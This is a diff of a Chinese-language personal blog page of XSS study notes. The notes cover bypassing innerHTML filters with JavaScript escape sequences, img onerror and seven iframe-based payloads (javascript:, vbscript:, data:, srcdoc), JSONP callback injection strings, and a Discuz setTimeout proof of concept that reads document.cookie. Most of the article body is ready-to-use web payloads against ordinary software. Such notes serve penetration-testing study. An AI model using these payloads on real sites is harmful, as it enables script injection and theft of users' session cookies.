@@ -12,23 +12,22 @@
     
 
     
-    <meta name="description" content="http://xss.pkav.net/xss/
+    <meta name="description" content="http://xss.pkav.net/xss/JS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt; 利用js字符串的转义解析功能\76\x3e\u003c
 Dom XSSJS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt;   利用js字符串的转义解析功能\76``\x3e``\u003c
-09  方法:    1.根据html输出    2.定位缺陷参数的相关js代码(Ctrl+Shift+f)  (IE9以上会过滤innerHTML的字符,暂时不会绕)    可以正常解析  %0a 多用">
+09 dom基础  方法:    1.根据html输出    2.定位缺陷参数的相关j">
 <meta property="og:type" content="website">
 <meta property="og:title" content="A1exlism">
 <meta property="og:url" content="http://a1ex.net/wait/xss.html">
 <meta property="og:site_name" content="A1exlism">
-<meta property="og:description" content="http://xss.pkav.net/xss/
+<meta property="og:description" content="http://xss.pkav.net/xss/JS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt; 利用js字符串的转义解析功能\76\x3e\u003c
 Dom XSSJS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt;   利用js字符串的转义解析功能\76``\x3e``\u003c
-09  方法:    1.根据html输出    2.定位缺陷参数的相关js代码(Ctrl+Shift+f)  (IE9以上会过滤innerHTML的字符,暂时不会绕)    可以正常解析  %0a 多用">
-<meta property="og:image" content="http://a1ex.net/1">
-<meta property="og:updated_time" content="2015-12-15T15:43:45.839Z">
+09 dom基础  方法:    1.根据html输出    2.定位缺陷参数的相关j">
+<meta property="og:updated_time" content="2016-01-05T07:20:40.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="A1exlism">
-<meta name="twitter:description" content="http://xss.pkav.net/xss/
+<meta name="twitter:description" content="http://xss.pkav.net/xss/JS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt; 利用js字符串的转义解析功能\76\x3e\u003c
 Dom XSSJS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt;   利用js字符串的转义解析功能\76``\x3e``\u003c
-09  方法:    1.根据html输出    2.定位缺陷参数的相关js代码(Ctrl+Shift+f)  (IE9以上会过滤innerHTML的字符,暂时不会绕)    可以正常解析  %0a 多用">
+09 dom基础  方法:    1.根据html输出    2.定位缺陷参数的相关j">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -93,24 +92,23 @@ Dom XSSJS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt;   利用js字符�
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2015-12-15T15:43:45.839Z" itemprop="datePublished"> 发表于 12-15-2015</time>
+    <time datetime="2016-01-27T11:05:59.648Z" itemprop="datePublished"> 发表于 01-27-2016</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
-		<p><a href="http://xss.pkav.net/xss/" target="_blank" rel="external">http://xss.pkav.net/xss/</a></p>
+		<p><a href="http://xss.pkav.net/xss/" target="_blank" rel="external">http://xss.pkav.net/xss/</a><br>JS中innerHTML 过滤&lt;&gt;情况 —&gt; 利用js字符串的转义解析功能\76<code>\x3e</code>\u003c</p>
 <h3 id="Dom_XSS">Dom XSS</h3><p>JS中innerHTML 过滤&lt;&gt;情况 —&gt;   利用js字符串的转义解析功能<code>\76``\x3e``\u003c</code></p>
-<h4 id="09">09</h4><p>  方法:<br>    1.根据html输出<br>    2.定位缺陷参数的相关js代码(Ctrl+Shift+f)<br>  (IE9以上会过滤innerHTML的字符,暂时不会绕)<br>  <img src="1" onerror="alert(1)">  可以正常解析<br>  %0a 多用换行<br><code>chrome会自动对&quot;, &gt;, &lt; 进行转换.</code></p>
+<h4 id="09_dom基础">09 dom基础</h4><p>  方法:<br>    1.根据html输出<br>    2.定位缺陷参数的相关js代码(Ctrl+Shift+f)<br>  (IE9以上会过滤innerHTML的字符,暂时不会绕)<br>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span>  可以正常解析</span><br></pre></td></tr></table></figure></p>
+<p>  %0a 多用换行<br>chrome会自动对<code>&quot;, &gt;, &lt;</code>进行转换</p>
 <h4 id="10_前端找不到输出点">10   前端找不到输出点</h4><p>  1.利用报错查找相关代码(输入中用<code>\</code>构造语法错误)<br>  2.执行eval()</p>
-<h4 id="11_about_iframe">11    about iframe</h4><p><iframe src="javascript:alert(/xss/)">全平台通用 to:2015</iframe></p>
-<p><iframe onload="alert(/xss/)">事件触发类型</iframe>  </p>
-<p><iframe src="vbscript:msgbox(1)">IE现在依旧可用</iframe></p>
-<p><iframe src="data:text/html,<script>alert(/xss/)</script>">全平台通用</iframe></p>
-<p><iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe></p>
-<p><iframe src="data:text/html,<img src=1 onerror=alert(/xss/)>"></iframe></p>
-<p><iframe srcdoc="&lt;script&gt;alert(/xss/)&lt;/script&gt;">(HTML5)srcdoc IE不可用</iframe></p>
+<h4 id="11_about_iframe">11    about iframe</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"javascript:alert(/xss/)"</span>&gt;</span>全平台通用 to:2015<span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">onload</span>=<span class="value">"alert(/xss/)"</span>&gt;</span>事件触发类型<span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"vbscript:msgbox(1)"</span>&gt;</span>IE现在依旧可用<span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"data:text/html,&lt;script&gt;alert(/xss/)&lt;/script&gt;"</span>&gt;</span>全平台通用<span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"data:text/html,&lt;img src=1 onerror=alert(/xss/)&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">srcdoc</span>=<span class="value">"&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;"</span>&gt;</span>(HTML5)srcdoc IE不可用<span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h4 id="12_jsonp_的跨域请求访问">12  jsonp 的跨域请求访问</h4><p>URL类型:<br>  script src = “/xxx/json.php?callback=xxxx&amp;param1=yy&amp;param2=[可控参数]”<br>-&gt;变量名覆盖,F12查看相关js函数</p>
+<h4 id="12_jsonP_callback">12 jsonP callback</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script src=<span class="string">"/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]"</span></span><br><span class="line">callback=<span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="xml">alert(1)<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="typescript"> <span class="comment">//callback=External JS url</span></span><br><span class="line">callback=<span class="built_in">eval</span>(alert(<span class="number">1</span>));<span class="built_in">void</span>  <span class="comment">//void用来闭合原来的json数据格式</span></span><br><span class="line"><span class="keyword">type</span>=%<span class="number">26</span>callback=<span class="built_in">eval</span>();<span class="built_in">void</span>  <span class="comment">//重写原先的callback()函数</span></span></span></span></span><br></pre></td></tr></table></figure>
+<h4 id="13Dom_Discuz">13Dom Discuz</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(alert(<span class="regexp">/xss/</span>),<span class="number">2000</span>);  is different from setTimeout(<span class="string">"alert(/xss/)"</span>,<span class="number">2000</span>);(delay <span class="keyword">for</span> <span class="number">2</span> seconds)</span><br></pre></td></tr></table></figure>
+<p>Origin contents: setTimeout(“window.location.href=’<a href="http://aa.com/./POC&#39;&quot;,2000" target="_blank" rel="external">http://aa.com/./POC&#39;&quot;,2000</a>);<br><code>\</code> not be filtered //unicode hack<br>setTimeout(“window.location.href =’<a href="http://www.discuz.net/./a&#39;;alert(document.cookie);a=" target="_blank" rel="external">http://www.discuz.net/./a&#39;;alert(document.cookie);a=</a>‘’;”, 2000);<br>POC:  aaa\u0027;alert(document.cookie);<br>a better one: aaa\u0027.replace(/.+/,/javascript:alert(document.cookie)/.source);</p>
+<p>14.</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -174,7 +172,7 @@ Dom XSSJS中innerHTML 过滤&amp;lt;&amp;gt;情况 —&amp;gt;   利用js字符�
 		
 
 		<p class="copyright">
-		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2015 
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
 		
 		<a href="/about" target="_blank" title="A1ex">A1ex</a>
 		
